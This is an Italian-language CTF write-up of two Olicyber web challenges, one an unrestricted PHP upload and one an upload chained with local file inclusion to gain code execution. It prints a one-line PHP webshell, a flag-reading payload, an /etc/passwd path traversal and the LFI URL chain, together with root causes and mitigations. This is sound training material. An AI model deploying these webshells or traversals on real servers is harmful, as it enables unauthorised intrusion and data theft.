# Writeup — Olicyber CTF: File Upload / LFI to RCE

## Esercizio 1 — shellrevenge

**Target:** `http://shellrevenge.challs.olicyber.it/`
**Categoria:** Web — File Upload → RCE
**Difficoltà:** Facile

### Vulnerabilità

L'applicazione permette il caricamento diretto di file `.php` senza alcun controllo su estensione o contenuto (unrestricted file upload). Il file caricato viene salvato in una cartella pubblica (`/uploads/<hash>/`) ed è servito direttamente da Apache con l'handler PHP attivo, quindi il codice caricato viene **eseguito immediatamente** all'accesso via browser.

### Exploitation

1. **Upload del payload.** Caricato un file `attacco2.php` con contenuto:
   ```php
   <?php system("cat ../../../../../../../flag.txt") ?>
   ```
   Il server ha salvato il file in:
   ```text
   /uploads/9b63b1c9c45936e17df687f314f3cae2/attacco2.php
   ```

2. **Esecuzione.** Visitando direttamente il file:
   ```text
   http://shellrevenge.challs.olicyber.it/uploads/9b63b1c9c45936e17df687f314f3cae2/attacco2.php
   ```
   Apache ha interpretato ed eseguito il codice PHP, restituendo il contenuto di `flag.txt`.

3. **Webshell interattiva.** Per maggiore flessibilità (non dover ricaricare un file per ogni comando), è stata caricata una vera e propria webshell:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
   Interrogabile poi via query string:
   ```text
   http://shellrevenge.challs.olicyber.it/uploads/9b63b1c9c45936e17df687f314f3cae2/attacco2.php?cmd=cat+../../../../../../../../flag.txt
   ```

### Causa radice

- Nessuna validazione dell'estensione/tipo MIME del file caricato lato server
- Cartella upload servita con esecuzione PHP abilitata (nessun `.htaccess` o config Apache/nginx che disabiliti l'handler PHP su quel path)
- Nessuna autenticazione/autorizzazione sull'endpoint di upload o sull'accesso ai file caricati

### Flag

Ottenuta con `cat` diretto della flag tramite il comando iniettato via `system()`.

### Mitigazioni

- Validare estensione e contenuto reale del file (magic bytes), non fidarsi del nome
- Salvare gli upload fuori dalla webroot, o in una cartella con esecuzione PHP disabilitata (`php_admin_flag engine off` / blocco a livello di `location` in nginx)
- Rinominare i file caricati con nomi non prevedibili e senza estensione eseguibile
- Eseguire l'applicazione con permessi minimi (evitare che il processo web possa leggere `flag.txt` o file sensibili al di fuori della sua directory)

---

## Esercizio 2 — shellrevenge2

**Target:** `http://shellrevenge2.challs.olicyber.it/`
**Categoria:** Web — File Upload + LFI → RCE
**Difficoltà:** Media

### Vulnerabilità

A differenza del primo esercizio, qui la cartella `/uploads/` **non esegue** i file PHP caricati direttamente: Apache li serve come testo grezzo (confermato da `curl -I`, nessun `Content-Type` PHP, `Content-Length` corrispondente al file sorgente).

Tuttavia, `index.php` espone un parametro `page` vulnerabile a **Local File Inclusion (LFI)**:
```text
index.php?page=<file>
```
usato internamente con `include()`. Questo permette sia il path traversal per leggere file di sistema, sia — punto chiave — l'inclusione (e quindi esecuzione) di un file PHP caricato in precedenza, aggirando la restrizione sull'esecuzione diretta.

### Exploitation

1. **Conferma LFI.** Il traversal su `page` ha permesso la lettura di file di sistema:
   ```text
   index.php?page=../../../../../etc/passwd
   ```
   confermando la vulnerabilità e stimando la profondità di traversal necessaria.

2. **Tentativo diretto su `/getflag`.** Un primo tentativo di include diretto su `getflag`:
   ```text
   index.php?page=../../../../../../../../../../../../getflag
   ```
   ha restituito `Permission denied` — indice che `getflag` è un **binario eseguibile** (non un sorgente leggibile/includibile come testo), da lanciare come processo e non da includere come file.

3. **Upload della webshell.** Caricato lo stesso payload dell'esercizio 1:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
   salvato in `/uploads/<hash>/attacco2.php`. L'accesso diretto al file **non esegue** il codice (Apache lo serve come testo), quindi non è sfruttabile da solo.

4. **Bypass via LFI.** Il file caricato è stato incluso tramite il parametro `page` dell'LFI in `index.php`. A differenza dell'accesso diretto via Apache, `include()` in PHP **interpreta sempre come codice** qualunque file gli venga passato, indipendentemente da come il webserver lo servirebbe normalmente. Questo bypassa la protezione sulla cartella uploads:
   ```text
   index.php?page=<path-relativo-o-assoluto-a>/uploads/<hash>/attacco2.php&cmd=/getflag
   ```
   Il parametro `cmd` viene letto correttamente dal file incluso perché PHP popola `$_GET` con l'intera query string della richiesta, non solo con i parametri "attesi" dallo script che la riceve.

5. **Esecuzione di `getflag`.** Con la webshell ora effettivamente eseguita (tramite `include`), il comando `cmd=/getflag` è stato lanciato con i permessi del processo PHP/Apache, ottenendo l'output del binario e la flag.

### Causa radice

- LFI su `index.php?page=` senza whitelist di file consentiti né sanitizzazione del path
- Directory upload con esecuzione PHP disabilitata a livello Apache, ma **eseguibile comunque tramite `include()`** — la mitigazione copre solo l'accesso diretto via HTTP, non l'inclusione lato server
- `getflag` presumibilmente un binario con permessi di esecuzione per l'utente del webserver ma non pensato per essere raggiunto in questo modo

### Flag

Ottenuta eseguendo `/getflag` tramite la webshell caricata e inclusa via LFI (`page=...attacco2.php&cmd=/getflag`).

### Mitigazioni

- Whitelist rigorosa dei file includibili in `page` (mai concatenare input utente direttamente in `include`/`require`)
- Disabilitare i wrapper PHP pericolosi (`allow_url_include = Off`, già buona norma di default)
- Anche disabilitando l'esecuzione PHP su `/uploads/` via Apache, ricordare che `include()` bypassa questa protezione: la vera mitigazione è impedire che utenti non fidati possano scrivere file in path raggiungibili da `include`, oppure isolare gli upload su storage non processabile da PHP (es. bucket separato, permessi restrittivi, o validazione file tipo/contenuto)
- Principio del minimo privilegio sul processo web rispetto a binari sensibili come `getflag`

---

## Confronto tra i due esercizi

| Aspetto | shellrevenge | shellrevenge2 |
|---|---|---|
| Esecuzione upload diretta | Sì (Apache esegue `.php` in `/uploads/`) | No (servito come testo grezzo) |
| Vulnerabilità aggiuntiva | — | LFI su `index.php?page=` |
| Tecnica di bypass | Nessuna necessaria | `include()` esegue comunque il PHP anche se Apache non lo farebbe |
| Target finale | `flag.txt` (leggibile) | `/getflag` (binario, richiede esecuzione non lettura) |
